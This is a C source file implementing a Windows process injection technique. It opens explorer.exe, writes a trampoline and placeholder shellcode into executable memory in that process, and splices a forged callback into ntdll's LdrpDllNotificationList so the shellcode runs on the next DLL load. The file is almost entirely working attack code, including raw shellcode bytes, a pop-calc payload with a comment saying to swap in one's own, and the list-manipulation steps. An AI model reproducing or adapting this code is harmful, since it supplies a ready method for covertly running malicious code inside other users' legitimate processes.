#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include "nt.h"



int FindTarget(const char* procname) {

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);
    printf("[+] Remote PID: %i\n", pid);
    return pid;
}

BOOL MaskCompare(const BYTE* pData, const BYTE* bMask, const char* szMask)
{
    for (; *szMask; ++szMask, ++pData, ++bMask)
        if (*szMask == 'x' && *pData != *bMask)
            return FALSE;
    return TRUE;
}

DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMask)
{
    for (DWORD i = 0; i < dwLen; i++)
        if (MaskCompare((PBYTE)(dwAddress + i), bMask, szMask))
            return (DWORD_PTR)(dwAddress + i);

    return 0;
}

LPVOID GetNtdllBase(HANDLE hProc) {

    // find NtQueryInformationProcess function
    NtQueryInformationProcess pNtQueryInformationProcess = (NtQueryInformationProcess)GetProcAddress((HMODULE)GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

    // Get the PEB of the remote process
    PROCESS_BASIC_INFORMATION info;
    NTSTATUS status = pNtQueryInformationProcess(hProc, ProcessBasicInformation, &info, sizeof(info), 0);
    ULONG_PTR ProcEnvBlk = (ULONG_PTR)info.PebBaseAddress;

    // Read the address pointer of the remote Ldr
    ULONG_PTR ldrAddress = 0;
    BOOL res = ReadProcessMemory(hProc, ((char*)ProcEnvBlk + offsetof(_PEB, pLdr)), &ldrAddress, sizeof(ULONG_PTR), nullptr);

    // Read the address of the remote InLoadOrderModuleList head
    ULONG_PTR ModuleListAddress = 0;
    res = ReadProcessMemory(hProc, ((char*)ldrAddress + offsetof(PEB_LDR_DATA, InLoadOrderModuleList)), &ModuleListAddress, sizeof(ULONG_PTR), nullptr);

    // Read the first LDR_DATA_TABLE_ENTRY in the remote InLoadOrderModuleList
    LDR_DATA_TABLE_ENTRY ModuleEntry = { 0 };
    res = ReadProcessMemory(hProc, (LPCVOID)ModuleListAddress, &ModuleEntry, sizeof(LDR_DATA_TABLE_ENTRY), nullptr);

    LIST_ENTRY* ModuleList = (LIST_ENTRY*)&ModuleEntry;
    WCHAR name[1024];
    ULONG_PTR nextModuleAddress = 0;

    LPWSTR sModuleName = (LPWSTR)L"ntdll.dll";

    // Start the forloop with reading the first LDR_DATA_TABLE_ENTRY in the remote InLoadOrderModuleList
    for (ReadProcessMemory(hProc, (LPCVOID)ModuleListAddress, &ModuleEntry, sizeof(LDR_DATA_TABLE_ENTRY), nullptr);
        // Stop when we reach the last entry
        (ULONG_PTR)(ModuleList->Flink) != ModuleListAddress;
        // Read the next entry in the list
        ReadProcessMemory(hProc, (LPCVOID)nextModuleAddress, &ModuleEntry, sizeof(LDR_DATA_TABLE_ENTRY), nullptr))
    {

        // Zero out the buffer for the dll name
        memset(name, 0, sizeof(name));

        // Read the buffer of the remote BaseDllName UNICODE_STRING into the buffer "name"
        ReadProcessMemory(hProc, (LPCVOID)ModuleEntry.BaseDllName.pBuffer, &name, ModuleEntry.BaseDllName.Length, nullptr);

        // Check if the name of the current module is ntdll.dll and if so, return the DllBase address
        if (wcscmp(name, sModuleName) == 0) {
            return (LPVOID)ModuleEntry.DllBase;
        }

        // Otherwise, set the nextModuleAddress to point for the next entry in the list
        ModuleList = (LIST_ENTRY*)&ModuleEntry;
        nextModuleAddress = (ULONG_PTR)(ModuleList->Flink);
    }
    return 0;
}

// Our dummy callback function
VOID DummyCallback(ULONG NotificationReason, const PLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context)
{
    return;
}

// Get LdrpDllNotificationList head address
PLIST_ENTRY GetDllNotificationListHead() {
    PLIST_ENTRY head = 0;

    // Get handle of ntdll
    HMODULE hNtdll = GetModuleHandleA("NTDLL.dll");

    if (hNtdll != NULL) {

        // find LdrRegisterDllNotification function
        _LdrRegisterDllNotification pLdrRegisterDllNotification = (_LdrRegisterDllNotification)GetProcAddress(hNtdll, "LdrRegisterDllNotification");

        // find LdrUnregisterDllNotification function
        _LdrUnregisterDllNotification pLdrUnregisterDllNotification = (_LdrUnregisterDllNotification)GetProcAddress(hNtdll, "LdrUnregisterDllNotification");

        // Register our dummy callback function as a DLL Notification Callback
        PVOID cookie;
        NTSTATUS status = pLdrRegisterDllNotification(0, (PLDR_DLL_NOTIFICATION_FUNCTION)DummyCallback, NULL, &cookie);
        if (status == 0) {
            printf("[+] Successfully registered dummy callback\n");

            // Cookie is the last callback registered so its Flink holds the head of the list.
            head = ((PLDR_DLL_NOTIFICATION_ENTRY)cookie)->List.Flink;
            printf("[+] Found LdrpDllNotificationList head: 0x%p\n", head);

            // Unregister our dummy callback function
            status = pLdrUnregisterDllNotification(cookie);
            if (status == 0) {
                printf("[+] Successfully unregistered dummy callback\n");
            }
        }
    }

    return head;
}

// Print LdrpDllNotificationList of a remote process
void PrintDllNotificationList(HANDLE hProc, LPVOID remoteHeadAddress) {
    printf("\n");
    printf("[+] Remote DLL Notification Block List:\n");

    // Allocate memory buffer for LDR_DLL_NOTIFICATION_ENTRY
    BYTE* entry = (BYTE*)malloc(sizeof(LDR_DLL_NOTIFICATION_ENTRY));

    // Read the head entry from the remote process
    ReadProcessMemory(hProc, remoteHeadAddress, entry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
    LPVOID currentEntryAddress = remoteHeadAddress;
    do {

        // print the addresses of the LDR_DLL_NOTIFICATION_ENTRY and its callback function
        printf("    0x%p -> 0x%p\n", currentEntryAddress, ((PLDR_DLL_NOTIFICATION_ENTRY)entry)->Callback);

        // Get the address of the next callback in the list
        currentEntryAddress = ((PLDR_DLL_NOTIFICATION_ENTRY)entry)->List.Flink;

        // Read the next callback in the list
        ReadProcessMemory(hProc, currentEntryAddress, entry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);

    } while ((PLIST_ENTRY)currentEntryAddress != remoteHeadAddress); // Stop when we reach the head of the list again

    free(entry);

    printf("\n");
}

// Pop Calc.exe Shellcode from Sektor7
// Please note that this shellcode is not thread safe and is exiting the process upon execution - obviously you should replace it
unsigned char shellcode[276] = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x0, 0x0, 0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0xf, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x1, 0xd0, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x1, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x1, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x3, 0x4c, 0x24, 0x8, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x1, 0xd0, 0x66, 0x41, 0x8b, 0xc, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x1, 0xd0, 0x41, 0x8b, 0x4, 0x88, 0x48, 0x1, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x8d, 0x1, 0x1, 0x0, 0x0, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0xa, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x6, 0x7c, 0xa, 0x80, 0xfb, 0xe0, 0x75, 0x5, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x0, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x0 };

unsigned char restore[] = {
    0x41, 0x56,														// push r14
    0x49, 0xBE, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,		// move r14, 0x1122334455667788
    0x41, 0xC7, 0x06, 0x44, 0x33, 0x22, 0x11,						// mov dword [r14], 0x11223344
    0x41, 0xC7, 0x46, 0x04, 0x44, 0x33, 0x22, 0x11, 				// mov dword [r14+4], 0x11223344
    0x49, 0xBE, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,		// move r14, 0x1122334455667788
    0x41, 0xC7, 0x06, 0x44, 0x33, 0x22, 0x11,						// mov dword [r14], 0x11223344
    0x41, 0xC7, 0x46, 0x04, 0x44, 0x33, 0x22, 0x11, 				// mov dword [r14+4], 0x11223344
    0x41, 0x5e,														// pop r14
};

// Trampoline shellcode for creating TpAllocWork for our restore prologue and malicious shellcode
// Created using https://github.com/Cracked5pider/ShellcodeTemplate
unsigned char trampoline[] = { 0x56, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20, 0xe8, 0xf, 0x0, 0x0, 0x0, 0x48, 0x89, 0xf4, 0x5e, 0xc3, 0x66, 0x2e, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x55, 0xb9, 0xf0, 0x1d, 0xd3, 0xad, 0x41, 0x54, 0x57, 0x56, 0x53, 0x31, 0xdb, 0x48, 0x83, 0xec, 0x30, 0xe8, 0xf9, 0x0, 0x0, 0x0, 0xb9, 0x53, 0x17, 0xe6, 0x70, 0x49, 0x89, 0xc5, 0xe8, 0xec, 0x0, 0x0, 0x0, 0x49, 0x89, 0xc4, 0x4d, 0x85, 0xed, 0x74, 0x10, 0xba, 0xda, 0xb3, 0xf1, 0xd, 0x4c, 0x89, 0xe9, 0xe8, 0x28, 0x1, 0x0, 0x0, 0x48, 0x89, 0xc3, 0x4d, 0x85, 0xe4, 0x74, 0x32, 0x4c, 0x89, 0xe1, 0xba, 0x37, 0x8c, 0xc5, 0x3f, 0xe8, 0x13, 0x1, 0x0, 0x0, 0x4c, 0x89, 0xe1, 0xba, 0xb2, 0x5a, 0x91, 0x4d, 0x48, 0x89, 0xc7, 0xe8, 0x3, 0x1, 0x0, 0x0, 0x4c, 0x89, 0xe1, 0xba, 0x4d, 0xff, 0xa9, 0x27, 0x48, 0x89, 0xc6, 0xe8, 0xf3, 0x0, 0x0, 0x0, 0x49, 0x89, 0xc4, 0xeb, 0x7, 0x45, 0x31, 0xe4, 0x31, 0xf6, 0x31, 0xff, 0x45, 0x31, 0xc9, 0x45, 0x31, 0xc0, 0x48, 0x8d, 0x4c, 0x24, 0x28, 0x48, 0xba, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x48, 0xc7, 0x44, 0x24, 0x28, 0x0, 0x0, 0x0, 0x0, 0xff, 0xd7, 0x48, 0x8b, 0x4c, 0x24, 0x28, 0xff, 0xd6, 0x48, 0x8b, 0x4c, 0x24, 0x28, 0x41, 0xff, 0xd4, 0xba, 0x0, 0x10, 0x0, 0x0, 0x48, 0x83, 0xc9, 0xff, 0xff, 0xd3, 0x48, 0x83, 0xc4, 0x30, 0x5b, 0x5e, 0x5f, 0x41, 0x5c, 0x41, 0x5d, 0xc3, 0x49, 0x89, 0xd1, 0x49, 0x89, 0xc8, 0xba, 0x5, 0x15, 0x0, 0x0, 0x8a, 0x1, 0x4d, 0x85, 0xc9, 0x75, 0x6, 0x84, 0xc0, 0x75, 0x16, 0xeb, 0x2f, 0x41, 0x89, 0xca, 0x45, 0x29, 0xc2, 0x4d, 0x39, 0xca, 0x73, 0x24, 0x84, 0xc0, 0x75, 0x5, 0x48, 0xff, 0xc1, 0xeb, 0x7, 0x3c, 0x60, 0x76, 0x3, 0x83, 0xe8, 0x20, 0x41, 0x89, 0xd2, 0xf, 0xb6, 0xc0, 0x48, 0xff, 0xc1, 0x41, 0xc1, 0xe2, 0x5, 0x44, 0x1, 0xd0, 0x1, 0xc2, 0xeb, 0xc4, 0x89, 0xd0, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x57, 0x56, 0x48, 0x89, 0xce, 0x53, 0x48, 0x83, 0xec, 0x20, 0x65, 0x48, 0x8b, 0x4, 0x25, 0x60, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x78, 0x20, 0x48, 0x89, 0xfb, 0xf, 0xb7, 0x53, 0x48, 0x48, 0x8b, 0x4b, 0x50, 0xe8, 0x85, 0xff, 0xff, 0xff, 0x89, 0xc0, 0x48, 0x39, 0xf0, 0x75, 0x6, 0x48, 0x8b, 0x43, 0x20, 0xeb, 0x11, 0x48, 0x8b, 0x1b, 0x48, 0x85, 0xdb, 0x74, 0x5, 0x48, 0x39, 0xdf, 0x75, 0xd9, 0x48, 0x83, 0xc8, 0xff, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x5e, 0x5f, 0xc3, 0x41, 0x57, 0x41, 0x56, 0x49, 0x89, 0xd6, 0x41, 0x55, 0x41, 0x54, 0x55, 0x31, 0xed, 0x57, 0x56, 0x53, 0x48, 0x89, 0xcb, 0x48, 0x83, 0xec, 0x28, 0x48, 0x63, 0x41, 0x3c, 0x8b, 0xbc, 0x8, 0x88, 0x0, 0x0, 0x0, 0x48, 0x1, 0xcf, 0x44, 0x8b, 0x7f, 0x20, 0x44, 0x8b, 0x67, 0x1c, 0x44, 0x8b, 0x6f, 0x24, 0x49, 0x1, 0xcf, 0x39, 0x6f, 0x18, 0x76, 0x31, 0x89, 0xee, 0x31, 0xd2, 0x41, 0x8b, 0xc, 0xb7, 0x48, 0x1, 0xd9, 0xe8, 0x15, 0xff, 0xff, 0xff, 0x4c, 0x39, 0xf0, 0x75, 0x18, 0x48, 0x1, 0xf6, 0x48, 0x1, 0xde, 0x42, 0xf, 0xb7, 0x4, 0x2e, 0x48, 0x8d, 0x4, 0x83, 0x42, 0x8b, 0x4, 0x20, 0x48, 0x1, 0xd8, 0xeb, 0x4, 0xff, 0xc5, 0xeb, 0xca, 0x48, 0x83, 0xc4, 0x28, 0x5b, 0x5e, 0x5f, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc3, 0x90, 0x90, 0x90, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x58, 0x48, 0x83, 0xe8, 0x5, 0xc3, 0xf, 0x1f, 0x44, 0x0 };

int main()
{
    // Get local LdrpDllNotificationList head address
    LPVOID localHeadAddress = (LPVOID)GetDllNotificationListHead();
    printf("[+] Local LdrpDllNotificationList head address: 0x%p\n", localHeadAddress);

    // Get local NTDLL base address
    HANDLE hNtdll = GetModuleHandleA("NTDLL.dll");
    printf("[+] Local NTDLL base address: 0x%p\n", hNtdll);

    // Calculate the offset of LdrpDllNotificationList from NTDLL base
    int offsetFromBase = (BYTE*)localHeadAddress - (BYTE*)hNtdll;
    printf("[+] LdrpDllNotificationList offset from NTDLL base: 0x%X\n", offsetFromBase);

    // Open handle to remote process
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, FindTarget("explorer.exe"));
    printf("[+] Got handle to remote process\n");

    // Get remote NTDLL base address
    LPVOID remoteNtdllBase = GetNtdllBase(hProc);
    LPVOID remoteHeadAddress = (BYTE*)remoteNtdllBase + offsetFromBase;
    printf("[+] Remote LdrpDllNotificationList head address 0x%p\n", remoteHeadAddress);

    // Print the remote Dll Notification List
    PrintDllNotificationList(hProc, remoteHeadAddress);

    // Allocate memory for our trampoline + restore prologue + shellcode in the remote process
    LPVOID trampolineEx = VirtualAllocEx(hProc, 0, sizeof(restore) + sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("[+] Allocated memory for restore trampoline + prologue + shellcode in remote process\n");
    printf("[+] Trampoline address in remote process: 0x%p\n", trampolineEx);

    // Offset the size of the trampoline to get the restore prologue address
    LPVOID restoreEx = (BYTE*)trampolineEx + sizeof(trampoline);
    printf("[+] Restore prologue address in remote process: 0x%p\n", restoreEx);

    // Offset the size of the trampoline and restore prologue to get the shellcode address
    LPVOID shellcodeEx = (BYTE*)trampolineEx + sizeof(trampoline) + sizeof(restore);
    printf("[+] Shellcode address in remote process: 0x%p\n", shellcodeEx);

    // Find our restoreEx place holder in the trampoline shellcode
    LPVOID restoreExInTrampoline = (LPVOID)FindPattern((DWORD_PTR)&trampoline, sizeof(trampoline), (PBYTE)"\x11\x11\x11\x11\x11\x11\x11\x11", (PCHAR)"xxxxxxxx");

    // Overwrite our restoreEx place holder with the address of our restore prologue
    memcpy(restoreExInTrampoline, &restoreEx, 8);

    // Write the trampoline shellcode to the remote process
    WriteProcessMemory(hProc, trampolineEx, trampoline, sizeof(trampoline), nullptr);
    printf("[+] trampoline has been written to remote process: 0x%p\n", trampolineEx);

    // Write the shellcode to the remote process
    WriteProcessMemory(hProc, shellcodeEx, shellcode, sizeof(shellcode), nullptr);
    printf("[+] Shellcode has been written to remote process: 0x%p\n", shellcodeEx);

    // Create a new LDR_DLL_NOTIFICATION_ENTRY
    LDR_DLL_NOTIFICATION_ENTRY newEntry = {};
    newEntry.Context = NULL;

    // Set the Callback attribute to point to our trampoline
    newEntry.Callback = (PLDR_DLL_NOTIFICATION_FUNCTION)trampolineEx;

    // We want our new entry to be the first in the list 
    // so its List.Blink attribute should point to the head of the list
    newEntry.List.Blink = (PLIST_ENTRY)remoteHeadAddress;

    // Allocate memory buffer for LDR_DLL_NOTIFICATION_ENTRY
    BYTE* remoteHeadEntry = (BYTE*)malloc(sizeof(LDR_DLL_NOTIFICATION_ENTRY));

    // Read the head entry from the remote process
    ReadProcessMemory(hProc, remoteHeadAddress, remoteHeadEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);

    // Set the new entry's List.Flink attribute to point to the original first entry in the list
    newEntry.List.Flink = ((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink;

    // Allocate memory for our new entry
    LPVOID newEntryAddress = VirtualAllocEx(hProc, 0, sizeof(LDR_DLL_NOTIFICATION_ENTRY), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("[+] Allocated memory for new entry in remote process: 0x%p\n", newEntryAddress);

    // Write our new entry to the remote process
    WriteProcessMemory(hProc, (BYTE*)newEntryAddress, &newEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
    printf("[+] New entry has been written to remote process: 0x%p\n", newEntryAddress);

    // Calculate the addresses we need to overwrite with our new entry's address
    // The previous entry's Flink (head) and the next entry's Blink (original 1st entry)
    LPVOID previousEntryFlink = (LPVOID)((BYTE*)remoteHeadAddress + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Flink));
    LPVOID nextEntryBlink = (LPVOID)((BYTE*)((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Blink));

    // buffer for the original values we are goind to overwrite
    unsigned char originalValue[8] = {};

    // Read the original value of the previous entry's Flink (head)
    ReadProcessMemory(hProc, previousEntryFlink, &originalValue, 8, nullptr);
    memcpy(&restore[4], &previousEntryFlink, 8); // Set address to restore for previous entry's Flink (head)
    memcpy(&restore[15], &originalValue[0], 4); // Set the value to restore (1st half of value)
    memcpy(&restore[23], &originalValue[4], 4); // Set the value to restore (2nd half of value)

    // Read the original value the next entry's Blink (original 1st entry)
    ReadProcessMemory(hProc, nextEntryBlink, &originalValue, 8, nullptr);
    memcpy(&restore[29], &nextEntryBlink, 8); // Set address to restore for next entry's Blink (original 1st entry)
    memcpy(&restore[40], &originalValue[0], 4); // Set the value to restore (1st half of value)
    memcpy(&restore[48], &originalValue[4], 4); // Set the value to restore (2nd half of value)

    // Write the restore prologue to the remote process
    WriteProcessMemory(hProc, restoreEx, restore, sizeof(restore), nullptr);
    printf("[+] Restore prologue has been written to remote process: 0x%p\n", restoreEx);

    // Overwrite the previous entry's Flink (head) with our new entry's address
    WriteProcessMemory(hProc, previousEntryFlink, &newEntryAddress, 8, nullptr);

    // Overwrite the next entry's Blink (original 1st entry) with our new entry's address
    WriteProcessMemory(hProc, nextEntryBlink, &newEntryAddress, 8, nullptr);

    printf("[+] LdrpDllNotificationList has been modified.\n");
    printf("[+] Our new entry has been inserted.\n");

    // Print the remote Dll Notification List
    PrintDllNotificationList(hProc, remoteHeadAddress);

}